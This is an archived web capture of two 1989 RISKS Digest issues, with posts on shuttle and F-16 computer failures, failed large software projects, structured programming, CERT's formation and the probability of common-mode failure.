&lt;<A HREF="mailto:jon@june.cs.washington.edu">
jon@june.cs.washington.edu
</A>&gt;
</address>
<i>
20 Jan 1989 15:27:13 EST
</i><PRE>

Here are excerpts from an article that appeared a week before the flight
of the space shuttle Discovery last September:

NASA's close calls: lessons learned? by Richard Doherty, ELECTRONICS
ENGINEERING TIMES, September 6, 1988, pps. 4,8.
                               
... The House Science and Technology committee convened its own investigation
of the (January 1986 Challenger accident) just days after the Rogers commission
concluded its four-month effort.  (Its findings are reported in) `Investigation
of the Challenger Accident, House Report 99-1016'.  That report indicates ...
dozens of failures in the shuttle's General Purpose Computer (GPC) and Avionics
systems. ... NASA has reviewed these flight anomalies and decided that they fit
within the acceptable risk criteria.  Thus, it has not made any significant
changes to system hardware or software for Discovery's launch. ... Most
engineers tracking the shuttle program can recall very few reported avionics
and computer-system failures during the program's 24 completed missions.
Nevertheless, more than 700 anomalies involving computers and avionics have
been logged by NASA. ... 

[Here follow just a few of many examples from the EE TIMES article.  Most seem
to involve hardware or sensor failures. Several examples in the article are not
computer- or even avionics-related. ] 

STS-6, April 4, 1983: ... Landing gear must be manually deployed after computer
fails to trigger its descent.

STS-9, November 28, 1983: Four hours before re-entry, pilot orients orbiter
using RCS (Reaction Control System) steering jets. After jets fire, one
computer crashes.  A few minutes later, a second goes down [ There are four
redundant GPC computers running identical software plus a fifth GPC running
different backup software - JJ].  Pilot John Young delays landing while craft
drifts in space.  Then one of three Inertial Measurement Units fails.  (Young
testified three years later: `Had we then activated the Backup Flight Software,
loss of vehicle and crew would have resulted.'  He now says problems have been
resolved.  Post-flight analysis shows each GPC failed when RCS jet motion
jarred a piece of solder, shorting CPU boards). 

Before landing, the second of three APU's (Auxilliary Power Units) fails.  Fire
and explosion occurs while orbiter is parked at its landing site.  ... NASA
engineers label this incident a `double-failure scenario that just beat all the
probability odds.' ...

STS-19 (51-F) July 29, 1985:  Three minutes into ascent, a failure in one
of two thermocouples directs computer shutdown of center engine.  Two minutes
later, engine chamber pressure is indicated as zero.  Mission control decides
to Abort to Orbit. ... Challenger is in orbit 70 miles up, 50 miles lower
than planned.  Had shutdown occured a half-minute earlier, mission would
have had to abort over the Atlantic.  (NASA has reset some of the binary
thermocouple limits via software changes).

STS-13 (41-G), November 5, 1984: ... Landing gear must be manually deployed
after computer fails to trigger its descent.

- Jonathan Jacky, University of Washington 

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
F-16 that can't stall falls from sky
</A>
</H3>
<address>
Scot E Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.MN.ORG ">
sewilco@datapg.MN.ORG 
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 17:07:16 CST
</i><PRE>

Reprinted with permission from the Tampa Tribune, 23 December 1988, Page 1B

Crash of F-16 still unexplained by MacDill staff
By STEVE HUETTEL, Tribune Staff Writer

   TAMPA - Moments after an instructor warned 1st Lt. David S. Johnson that he
might be flying too slowly, the student pilot's F-16 fighter stalled and
plummeted into the Gulf of Mexico.  Johnson ejected safely Sept. 9 and was back
in the cockpit within a month.  A month before he is due to graduate, MacDill
Air Force Base officials still won't say whether the 24-year-old pilot was
negligent or if an onboard computer designed to keep the $9.5 million jet from
stalling failed.  But, crashing an F-16 isn't necessarily grounds for dismissal
from the six-month course, they say.
   "It's an environment where they're still learning the airplane, and
mistakes can happen," said Capt. Dian Lawhon, a MacDill spokeswoman.  "At
that point, they might not have acquired some of the skills they need."
Students can be yanked at any time, she said, for "gross pilot error."
   Word that Johnson's jet stalled surprised the F-16's manufacturer and
former pilots familiar with the fighter.
   A computer inside the fighter should override any commands that would cause
a stall, said Joe Thornton, a spokesman for General Dynamics in Fort Worth,
Texas.  "If a pilot tells the airplane to do anything the airplane doesn't want
to do, the computer will take control of the airplane from the pilot," he said.
"The pilots I talked to said you can't (stall) it."
   But the computer is programmed only for common, dangerous flight
configurations, said 1st Lt. Susan Brown, a MacDill spokeswoman.  "It's not set
up for every possible way you can get yourself into trouble," she said.
Johnson, of Parker, Colo., did not return telephone calls to comment on the
accident.
   On the morning of Sept. 9, he was practicing fighter maneuvers with an
instructor in a second plane over the Gulf west of Fort Myers.  It was
Johnson's seventh solo flight in the F-16.  He had flown more than 200 missions
in trainer aircraft, earning outstanding evaluations from his teachers at basic
flight and fighter preparation schools.
   Four times, the pilots flew a downward corkscrew maneuver in which Johnson
tried to get behind the other aircraft to line up a gun or missile shot.
Something went wrong as they broke off the exercise the last time.  The Air
Force won't release an investigation board's findings or statements by the
pilots.  But a heavily censored version of the report obtained under the
federal Freedom of Information Act states that Johnson's F-16 stalled after he
finished the last maneuver.
   A drawing of the maneuver doesn't show Johnson's speed or altitude.  The
instructor pilot he trailed started at more than 400 mph but slowed to 150 mph
as he climbed to 14,700 feet at the end of the exercise.  "We got a little slow
there, check your air speed," the instructor warned in a transcript of his
radio conversation with Johnson.  The student acknowledged the message, then
disappeared from the instructor's sight.
   The F-16 can stall at speeds of 230 mph or slower, depending on its weight
and angle of flight, MacDill officials said.  They declined to say what speed
Johnson was flying when his plane stalled or the altitude at which he ejected.
The report drawing depicts Johnson's jet in a near-vertical climb just before
it stalled.  "That should never have happened," said Howard Acosta, a former
Navy pilot and St. Petersburg attorney who successfully sued General Dynamics
on behalf of an F-16 pilot's widow last year.  "The computer should change the
angle of attack and get the wing flying again."
   Unlike older aircraft, the F-16 has a fly-by-wire system that controls the
flaps and engines through electrical impulses.  The pilot's commands go through
a computer that prevents the aircraft from getting into situations where it
could stall or break apart from excessive gravity forces, say pilots.  "It's
designed not to stall," said a former F-16 pilot.  "It's made to recover.  You
can take your hands off, and it'll fly."

Scot E. Wilcoxon  sewilco@DataPg.MN.ORG    {amdahl|hpda}!bungia!datapg!sewilco
Data Progress 	 UNIX masts &amp; rigging  +1 612-825-2607    uunet!datapg!sewilco

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: China accused of software piracy
</A>
</H3>
<address>
Jim Olsen
&lt;<A HREF="mailto:olsen@XN.LL.MIT.EDU ">
olsen@XN.LL.MIT.EDU 
</A>&gt;
</address>
<i>
Sun, 22 Jan 89 13:50:51 EDT
</i><PRE>
Organization: MIT Lincoln Laboratory, Lexington, MA

&gt;American companies are losing "many millions" of dollars in potential
&gt;business in China because the companies' computer software has been
&gt;widely pirated...  China has no copyright law of its own...

This is an example of the risk in assuming that the laws of one's own country
apply (or ought to apply) everywhere.  Copyright and patent protection are,
fundamentally, matters of internal law for each country.  Foreign copyrights
exist only via international copyright convention.

In a nation which is not signatory to a copyright convention, foreign copyright
is invalid.  However, authors in such a nation receive no international
copyright protection.  Each nation decides if such a tradeoff is in its best
interests.

Thus, copying American computer programs in China is perfectly legal,
and therefore does not deserve the term 'piracy'.  American law does
not apply in China, even if some American companies would like it to.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Losing systems
</A>
</H3>
<address>
Dale Worley
&lt;<A HREF="mailto:worley@compass.UUCP ">
worley@compass.UUCP 
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 11:27:40 EST
</i><PRE>

Jerome Saltzer remarks that the domains of application of computers have been
enlarging at an enormous rate.  The rate at which computers become cheaper
relative to number of them sold (the "experience curve") is no different from
any other product.  What is different about computers is the extraordinary
price-sensitivity of potentially computerizable applications - a tiny drop in
the price of computers introduces whole new application domains.  This puts the
computer industry into a rapid positive feedback loop of dropping prices,
widening applications, and increasing unit sales.

I also agree with his remarks on how to manage computer-based projects, but you
must remember that one result of these policies is that one will get somewhat
less bang for the buck than the state of the art would tempt one to expect.

As far as managers are concerned, I'm reminded of a comment by Lester Thorow,
dean of the MIT School of Management, regarding their new "managing technology"
degree program:  Many managers want to learn how to manage technology, but few
want to learn about technology.

Certainly, American managers have little technical training, and few
(especially in the upper echelons) want to acquire any.  This has been blamed
for the inability of American companies to deal with rapidly changing
technology.  In contrast, German and Japanese managers often have technical
training and are reputed to be better at dealing with changing technology.  Do
they have a lower rate of computer project failure?

Dale Worley, Compass, Inc.                      compass!worley@think.com

</PRE>
<HR><H3><A NAME="subj6.2">
Re: Losing systems....
</A>
</H3>
<address>
Chris Lewis
&lt;<A HREF="mailto:clewis%ecicrl%gate%tmsoft@csri.toronto.edu ">
clewis%ecicrl%gate%tmsoft@csri.toronto.edu 
</A>&gt;
</address>
<i>
20 Jan 89 20:12:09 EST (Fri)
</i><PRE>

In Risks 8.6, Vince Manis postulates a number of hypothesis over how "megabuck
systems ... go into the trashcan" after seeing reports of two such in Risks 8.4.

I can add another reason with an example (actually a "near failure"):

	A Government creates the system by executive edict, without
	any technical study.  Especially those in non-technical areas
	where the problem isn't well understood.
	
Which I expect is the actual reason for the failure of the first example 
in risks 8.4.

The second example in Risks 8.4 is probably simply that there was *no* design
control.  In projects where there are multiple "customers", it is extremely
important to have firm control vested in *one* person or small group of people.
If you have dozens of people yammering for this feature or that, and nobody can
or will say "no" to some of them, you're in *deep* trouble.  The report on this
system implied that this was one of the main reasons for failure.

Which is also why some language standards are so big....
	  
My example:

The current incarnation of the Ontario Health Insurance Plan (Government run
health insurance system, OHIP for short) was created by Government legislation
(Ontario Health Insurance Act, 1972 - I think), to be in operation
approximately 6 months later.  At the time, the Ministry of Health didn't have
much of a DP dept., nor had there been *any* technical study.

When I studied this system for a Royal Commission back in '79, I can't help 
remembering how awestruck I was that they actually had the monster
in operation at 6 months.  Startup from zero staff, resource or facilities.
Awesome.  They then paid for it with two or three years of continuous
firefighting.  The only reason that they succeeded was that they had
lucked into some of the best DP people/managers I've *ever* met.  

As well as some of the worst senior administrative people I've ever had the
misfortune to meet.

This application is still probably the biggest single DP application in 
the entire province - 13 master files (one of which was 70 reels of 6250 
BPI tape back in '79), oh about 12 main programs and had to be run on a 
48 hour cycle.  It took somewhere near 24 hours to run on their machine
as of '77: 370/168 I believe.

The head analyst gave me a report discussing a lot of this, including
the comment "systems usually are obsolete and need to be replaced within
3-5 years - this one has already outlived it's lifespan by 5".

Last I heard, they're still running effectively the same stuff.... 
(10 years later)

Chris Lewis, Elegant Communications Inc., Markham, Ontario, Canada, 
{uunet!attcan, utzoo}!lsuc!{gate!eci386, ecicrl}!clewis

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 re: Structured Programming
</A>
</H3>
<address>
John (J.G.) Mainwaring 
&lt;<A HREF="mailto:CRM312A@BNR.CA">
CRM312A@BNR.CA
</A>&gt;
</address>
<i>
20 Jan 89 16:16:00 EST
</i><PRE>

In the replies to Karsh's article published to date, several interesting points
were made, but one clear statement of objective was missing.  The methods which
have come to be known as structured programming were intended to avoid the use
of what were then recognized as error prone contructs.  This is in the spirit
of analyzing aircraft accidents and changing instrument or control designs
which pilots tended to misunderstand or misuse.

There may well be those who have lost track of the idea that the structuring of
a program should break the job down into segments which are small enough to
understand, and eliminate hidden interactions between segments which make it
difficult to understand how they fit together.  It is possible to indent
beautifully, avoid gotos, keep modules under a page, and use data structures
that make it totally impossible to understand how it all fits together.  The
larger the system, the greater the difficulty of creating an overall design and
ensuring that the parts really fit together in an understandable way, ie that a
structure really exists at ALL levels.

Does anyone know of recent studies based on current languages used in nominally
structured fashion of what errors are most common and what disciplines seem
most likely to avoid them?  Such articles used to be common at one time.
Perhaps now would be a good time for a few more, preferably in some of the
popular as opposed to academic magazines.  The converted may enjoy a good
sermon, but it has the chance to do more good when it reaches a wider audience.

My views are probably my own but only coincidentally those of my
employer or anyone else.

</PRE>
<HR><H3><A NAME="subj7.2">
Structured Programming, Object Oriented Programming: A quote
</A>
</H3>
<address>
Mark Rosenstein 
&lt;<A HREF="mailto:rosenstein@mcc.com">
rosenstein@mcc.com
</A>&gt;
</address>
<i>
Sat, 21 Jan 89 08:27 CST
</i><PRE>
Organization: MCC, 3500 West Balcones Center Dr., Austin, TX  78759

David A. Moon from the foreword to "Object-Oriented Programming in
Common Lisp" by Sonya E. Keene [an interesting book, by the way]:

  The nature of object-oriented programming is such that it is most beneficial
  for large programs that are written by multiple authors and are expected to
  last a long time. The ease of implemententing a small, simple program does
  not much depend on what programming methodology is employed, and one who has
  dealt only with small programs may not see any point to the object-oriented
  discipline. However, anyone who has been through the design, development,
  documentation, testing, and maintenance of a large software system in a
  non-object-oriented fashion, and then has experienced the same process in an
  object-oriented system, will understand why there is so much interest in
  object-oriented programming. It isn't magic, but it is a good technique for
  organizing large software systems and making them comprehensible.

I believe the above is also exactly true with respect to structured programming.
Mark.

</PRE>
<HR><H3><A NAME="subj7.3">
Specious Arguments and Structured Programming
</A>
</H3>
<address>
Steve Pozgaj
&lt;<A HREF="mailto:ames!uunet!dmnhack!dmnboss!steve%pasteur.Berkeley.EDU@ucbvax.Berkeley.EDU ">
ames!uunet!dmnhack!dmnboss!steve%pasteur.Berkeley.EDU@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Fri, 20 Jan 89 08:55:40 EST
</i><PRE>

I have always enjoyed controversial debate, *but*, there is a major
difference between controversial debate and provocation.  I must say that I
find Bruce Karsh's posting in RISKS 8.8 simple provocation.  It is the kind
of statement that forces a "bite your tongue and count to 10" reaction.  Why?

Provocation can only lead to "heat" in arguments, not "light".  In this
regard, I agree wholeheartedly with Jim Horning's subsequent reply that we'd
all be better off, if we're to discuss structured programming, having a
discussion based on "light" issues, not "heat" issues.  You know, I'd bet
Karsh had his tongue just about puncturing his cheek when he wrote his
piece.  Surely he can't have been serious?  Either that or he's never
produced code bigger than a student programming assignment. (Wonder how it
passed with all those left-margin aligned GOTO's?-)

In the real world of programming, systems are often very complex, as well
as complicated.  To not bring a disciplined attitude to their construction
is suicide.  I learned structured programming at University, from people
such as Jim Horning.  It is one of many disciplines.  It works, as do
others.  In my opinion, it works better ... but, maybe, not for everybody.
However, I cannot imagine program construction without *some* discipline.

In any case, I view Karsh's provocation as one of "form", not "substance".  He
argues [very speciously] about indenting, variable naming, and other "rules"
which all pertain only to form.  This is like attacking literature based on
rules of grammar (e.g. saying that only "free form" prose is valid poetry
and that rhyming couplets produce garbage).  Why waste the time?  Any
conclusion can be drawn from incorrect premises, which is exactly what Karsh
does.  By stating that SP isn't about correctness, but about maintainability,
he goes on to draw all sorts of silly conjectures.  So what?           [...]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.12.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.14.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-64</DOCNO>
<DOCOLDNO>IA012-000131-B037-243</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.14.html 128.240.150.127 19970217025151 text/html 17610
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:50:19 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 14</TITLE>
<LINK REL="Prev" HREF="/Risks/8.13.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.15.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.13.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.15.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 14</H1>
<H2> Tuesday 24 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Re: Medical Software -- testing and verification 
</A>
<DD>
<A HREF="#subj1.1">
Dave Parnas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  NSA and the Internet 
</A>
<DD>
<A HREF="#subj2.1">
Vint Cerf
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Losing systems 
</A>
<DD>
<A HREF="#subj3.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computing Projects that Failed 
</A>
<DD>
<A HREF="#subj4.1">
Dave Platt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Object Oriented Programming 
</A>
<DD>
<A HREF="#subj5.1">
Benjamin Ellsworth
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Losing Systems 
</A>
<DD>
<A HREF="#subj6.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Computer Emergency Response Team (CERT) 
</A>
<DD>
<A HREF="#subj7.1">
Brian M. Clapper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Probability and Product Failure 
</A>
<DD>
<A HREF="#subj8.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Probabilities and airplanes 
</A>
<DD>
<A HREF="#subj9.1">
Robert Colwell
</A><br>
<A HREF="#subj9.2">
 Mike Olson
</A><br>
<A HREF="#subj9.3">
 Dale Worley
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Medical Software (Are computer risks different?) (RISKS-8.7)
</A>
</H3>
<address>
Dave Parnas
&lt;<A HREF="mailto:parnas@qucis.queensu.ca ">
parnas@qucis.queensu.ca 
</A>&gt;
</address>
<i>
Mon, 23 Jan 89 07:48:13 EST
</i><PRE>

In his contribution to Risks 8.7 Jon Jacky makes the statement that the
problems of testing and verification are broadly similar whether the machine
includes a computer or not.  I have heard this argument from many "old-time"
engineers and consider it quite false.  In the testing of conventional (analog)
devices we make use of the fact that the functions are continuous and that one
can put an upper bound on the derivatives or the frequency spectrum.  We use
those mathematical properties in deciding how many tests are required to
validate a device.  When digital technology is involved there are no limits on
the rate of change.  Further, with digital technology, the number of tests
required for black-box testing increases sharply with the lowest known
upper-bound on the number of states in the device.  If we do "white-box"
testing, we can reduce the number of tests required by exploiting the
regularity of the state space.  In practice, the regularity is present and
helpful for the testing of hardware but not terribly useful for software
testing.  In short, the technology being used does make a big difference in
testing and validation.

While I agree with Jon's statement that industry practices in software
development are often much worse than for other kinds of technology, that is
not the only explanation of our "special problem".  The technology itself is a
great contributor and always will be.

David Parnas, Queen's University, Kingston Ontario

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
NSA and the Internet
</A>
</H3>
<address>
&lt;<A HREF="mailto:CERF@A.ISI.EDU">
CERF@A.ISI.EDU
</A>&gt;
</address>
<i>
23 Jan 1989 01:11-EST
</i><PRE>

John Gilmore asks why NSA has 5 IMPs if they are NOT monitoring the
Internet. So far as I know, NSA does not have 5 IMPs on the Internet. It has
one to support Dockmaster. The agency has a variety of internal networks, of
course, but none are likely to be linked to the Internet since they are used
for classified applications for which the Internet is not approved.

Does Mr. Gilmore have some evidence he wishes to present that suggests the
NSA is engaging in an unacceptable activity on the Internet?
                                                                  Vint Cerf

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
   Re: Losing systems
</A>
</H3>
<address>
"Geoff. Lane. Tel UK-061 275 6051" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Mon, 23 Jan 89 09:34:58 GMT
</i><PRE>

In my experence the single most probable cause of a software project failing is
that the people who started the project have no real idea what they want in the
end. Almost everything else can be coped with but when you have to deal with a
constant stream of "design changes" not even the best people with the best
equipment can succeed.
                                        Geoff. Lane, UMRCC

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Computing Projects that Failed
</A>
</H3>
<address>
Dave Platt 
&lt;<A HREF="mailto:dplatt@coherent.com">
dplatt@coherent.com
</A>&gt;
</address>
<i>
Mon, 23 Jan 89 10:28:18 PST
</i><PRE>

On the subject of computing projects that failed for one reason or
another: I recommend that interested Risks readers look up some of Bob
Glass's books on this subject.  Glass has collected quite a number of
case-studies, changed the names to protect the innocent [and the
guilty, too], and organized them into categories according to the
primary reason for the failure (immature technology, wrong technology,
mismanagement, misimplementation, politics, etc.).  Some of the stories
are roaringly funny... f'rinstance, the mainframe at "Cornbelt U." that
survived a series of mishaps during installation (including being watered
by the University's lawn sprinklers), only to end up destroying itself
(and most of the building) during an earthquake.

Glass has written half-a-dozen books on the computing industry (most of
them date back to the '70s and early '80s).  The three most applicable
to Risks issues are: "Computing Projects that Failed", "Computer Messiahs:
More Computing Projects that Failed", and "Computing Catastrophies".
[I may be off a bit in the exact wording of the titles;  my copies are
at home.]

Based on the recent contributions to Risks concerning recent software-
project failures, it sounds to me as if most of the pitfalls that Glass
wrote about back in the '70s are alive and well in the late '80s!

Dave Platt    FIDONET:  Dave Platt on 1:204/444        VOICE: (415) 493-8805
  UUCP: ...!{ames,sun,uunet}!coherent!dplatt     DOMAIN: dplatt@coherent.com
  USNAIL: Coherent Thought Inc.  3350 West Bayshore #205  Palo Alto CA 94303

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Object Oriented Programming
</A>
</H3>
<address>
Benjamin Ellsworth 
&lt;<A HREF="mailto:ben%hpcvlx@hp-sde.sde.hp.com">
ben%hpcvlx@hp-sde.sde.hp.com
</A>&gt;
</address>
<i>
Mon, 23 Jan 89 13:54:59 pst
</i><PRE>

Recently a professor from the local university taught a class on OOP at our
site.  During the first lecture, he said that via OOP one can add
functionality to the module without changing the code.  I asked
incredulously, "Without changing *any* code?"  He said, "Yes."  A manager at
the class sagely nodded his head.

I should hope the risks are obvious.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
re: Losing Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 24 Jan 89 02:20:32 -0500
</i><PRE>

&gt;The losing systems almost always contain some elements of newness; in fact on
&gt;close inspection they usually contain several such elements...

To quote from John Gall's SYSTEMANTICS:  "A complex system that works is
invariably found to have evolved from a simple system that worked."  So
perhaps it's not so surprising that a lot of these done-yet-again-from-
scratch systems (how many different county records systems does the
world NEED?!?) fail.

                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Computer Emergency Response Team (CERT)
</A>
</H3>
<address>
Brian M. Clapper
&lt;<A HREF="mailto:clapper@NADC.ARPA ">
clapper@NADC.ARPA 
</A>&gt;
</address>
<i>
Tue, 24 Jan 89 10:18:01 EST
</i><PRE>

Excerpted from UNIX Today!, January 23, 1989 (reprinted without permission)

WASHINGTON -- The federal government's newly formed Computer Emergency
Response Team (CERT) is hoping to sign up 100 technical experts to aid in
its battle against computer viruses.
     CERT, formed last month by the Department of Defense's Advanced
Research Project Agency (DARPA) ... expects to sign volunteers from
federal, military and civilian agencies to act as advisors to users facing
possible network invasion.
     DARPA hopes to sign people from the National Institute of Science and
Technology, the National Security Agency, the Software Engineering
Institute and other government-funded university laboratories, and even the
FBI.
     The standing team of UNIX security experts will replace an ad hoc
group pulled together by the Pentagon last November to deal with the
infection of UNIX systems allegedly brought on by Robert Morris Jr., a
government spokesman said.
     CERT's charter will also include an outreach program to help educate
users about what they can do the prevent security lapses, according to Susan
Duncal, a spokeswoman for CERT.  The group is expected to produce a
"security audit" checklist to which users can refer when assessing their
network vulnerability.  The group is also expected to focus on repairing
security lapses that exist in current UNIX software.  To contact CERT, call
the Software Engineering Institute at Carnegie-Mellon University in
Pittsburgh at (412) 268-7090; or use the Arpanet mailbox address
cert@sei.cmu.edu.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
   Probability and Product Failure
</A>
</H3>
<address>
"Geoff. Lane. Tel UK-061 275 6051" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Mon, 23 Jan 89 09:17:33 GMT
</i><PRE>

Unfortunately, from reports here in Britain after the M1 plane crash, it
appears that there is a real problem with "Common Mode" failures in aircraft
engines. So if one fails then the probability of a second failing during the
same flight is much higher than would be expected.  The probabilities of
failure are not independent.

(BTW - in "fly by wire" systems they attempt to avoid common mode errors in the
software by having three independent groups implementing the system on three
different types of processor. Firstly this does NOT eliminate the problems of
errors in the system specification from which all three designs are derived.
Secondly what happens 10 years later when the software is updated to
incorporate new developments - are three more independent software houses
commissioned to produce the new software - or would this be done in-house by
some part-time students?)
                                           Geoff Lane UMRCC.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Probabilities (Re: <A HREF="/Risks/8.12.html">RISKS-8.12</A>)
</A>
</H3>
<address>
Robert Colwell
&lt;<A HREF="mailto:mfci!colwell@uunet.UU.NET ">
mfci!colwell@uunet.UU.NET 
</A>&gt;
</address>
<i>
Sun, 22 Jan 89 14:20:00 EST
</i><PRE>
Organization: Multiflow Computer Inc., Branford Ct. 06405

There is a definite danger to this analysis, stemming mostly from its essential
correctness.  There was a plane within the last two years (if memory serves)
that lost all three of its engines on a flight precisely because such events
are not necessarily independent.  Turned out that the same mechanic had worked
on all three and made the same mistake on all three (left off an oil seal, I
think).  Another example is the nuclear reactor fire of a couple of years ago,
where all the redundant control wiring was for nought because somebody routed
them all through the same conduit, so they were all destroyed at the same time.

One must be extremely careful with abstract analyses like these -- they can
be seductive, and they can lead to unjustified conclusions.

</PRE>
<HR><H3><A NAME="subj9.2">

</A>
</H3>
<address>
Mike Olson
&lt;<A HREF="mailto:mao@blia.UUCP ">
mao@blia.UUCP 
</A>&gt;
</address>
<i>
23 Jan 89 10:05:05 PST (Mon)
</i><PRE>
Subject: real discrete probability and airplanes

as at least two people have pointed out, my analysis of the likelihood of
failure was wrong.  i claimed that the probability of two engines failing
out of three was 6(p**2); the correct answer, of course, is 3(p**2).

thanks to A. Lester Buck (siswat!buck) and LordBah@cup.portal.com for
pointing out my error in a way befitting the kinder, gentler nation we
now live in.  it's not quite clear what i was computing, but it certainly
wasn't probability.  it wasn't even conditional probability, since i got
the independence argument wrong.

it's important to remember one of the real risks of the network -- the
potential for embarassing yourself in front of hundreds (thousands?) of
intelligent people.  next time, i check my work.
					mike olson, britton lee, inc.
					...!ucbvax!mtxinu!blia!mao

   [Also noted by Mike Wescott (m.wescott@ncrcae.Columbia.NCR.COM) and
   Dale Worley.  PGN]

</PRE>
<HR><H3><A NAME="subj9.3">
Probability
</A>
</H3>
<address>
Dale Worley
&lt;<A HREF="mailto:worley@compass.UUCP ">
worley@compass.UUCP 
</A>&gt;
</address>
<i>
Mon, 23 Jan 89 10:11:29 EST
</i><PRE>

